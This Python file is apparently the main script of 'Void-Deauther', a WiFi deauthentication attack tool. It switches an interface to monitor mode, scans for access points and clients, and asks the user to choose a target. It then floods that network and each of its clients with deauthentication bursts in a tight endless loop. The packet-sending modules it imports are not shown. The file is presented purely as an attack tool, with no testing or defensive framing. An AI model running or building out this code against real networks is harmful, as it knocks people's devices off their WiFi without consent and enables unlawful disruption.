import sys
import argparse
from modules.interface_manager import InterfaceManager
from modules.scanner import Scanner
from modules.deauth_engine import DeauthEngine
from modules.channel_hopper import ChannelHopper
from modules.ui_manager import UIManager
from rich.live import Live
import time

def main():
    parser = argparse.ArgumentParser(description="Void-Deauther - Advanced WiFi Deauthentication Tool")
    parser.add_argument("-i", "--interface", required=True, help="Wireless interface to use")
    args = parser.parse_args()

    im = InterfaceManager(args.interface)
    ui = UIManager()
    
    ui.banner()
    
    print(f"[*] Setting {args.interface} to monitor mode...")
    mode_status = im.set_monitor_mode(True)
    print(f"[*] {mode_status}")
    
    scanner = Scanner(args.interface)
    hopper = ChannelHopper(im)
    engine = DeauthEngine(args.interface)

    print("[*] Starting Scan (Press Ctrl+C to stop scanning)...")
    scanner.start()
    hopper.start()

    try:
        with Live(ui.display_scanning({}, {}), refresh_per_second=4, transient=True) as live:
            while True:
                aps, clients = scanner.get_results()
                live.update(ui.display_scanning(aps, clients))
                time.sleep(0.5)
    except KeyboardInterrupt:
        scanner.stop()
        hopper.stop()
        print("\n[*] Scanning stopped.")

    aps, clients = scanner.get_results()
    if not aps:
        print("[!] No networks found. Exiting.")
        im.set_monitor_mode(False)
        return

    # Simple selection logic for demo purposes
    # In a real tool, we would have an interactive selection menu here
    print("\n[*] Available Targets:")
    for i, (bssid, info) in enumerate(aps.items()):
        print(f"{i}. {info['ssid']} [{bssid}]")

    try:
        choice = int(input("\nSelect AP index to attack (or -1 to exit): "))
        if choice == -1:
            im.set_monitor_mode(False)
            return
        
        target_bssid = list(aps.keys())[choice]
        target_ssid = aps[target_bssid]['ssid']
        
        # 1. STOP Channel Hopping and Scanner
        print("[*] Stopping background scans...")
        hopper.stop()
        scanner.stop()
        
        # 2. SYNC Channel
        target_channel = aps[target_bssid]['channel']
        if target_channel:
            print(f"[*] Switching {args.interface} to channel {target_channel}...")
            im.set_channel(target_channel)
            time.sleep(1) # Wait for interface to settle
        
        # 3. GET Clients for this BSSID
        target_clients = [c for c, b in clients.items() if b == target_bssid]
        
        print(f"\n[!] ATTACKING: {target_ssid} [{target_bssid}]")
        if target_clients:
            print(f"[*] Found {len(target_clients)} clients to target.")
        else:
            print("[*] No clients found during scan. Performing broadcast attack only.")

        print("[*] Sending optimized deauth bursts (Press Ctrl+C to stop)...")
        
        while True:
            # Attack AP (Broadcast)
            engine.attack_bssid(target_bssid)
            
            # Attack each specific client
            for client_mac in target_clients:
                engine.attack_client(target_bssid, client_mac)
            
            time.sleep(0.01) # Very tight loop for "perfect" attack
        
    except KeyboardInterrupt:
        print("\n[*] Attack stopped.")
    except Exception as e:
        print(f"\n[!] Error: {e}")
    finally:
        im.set_monitor_mode(False)
        print("[*] Interface restored to managed mode. Goodbye.")

if __name__ == "__main__":
    main()
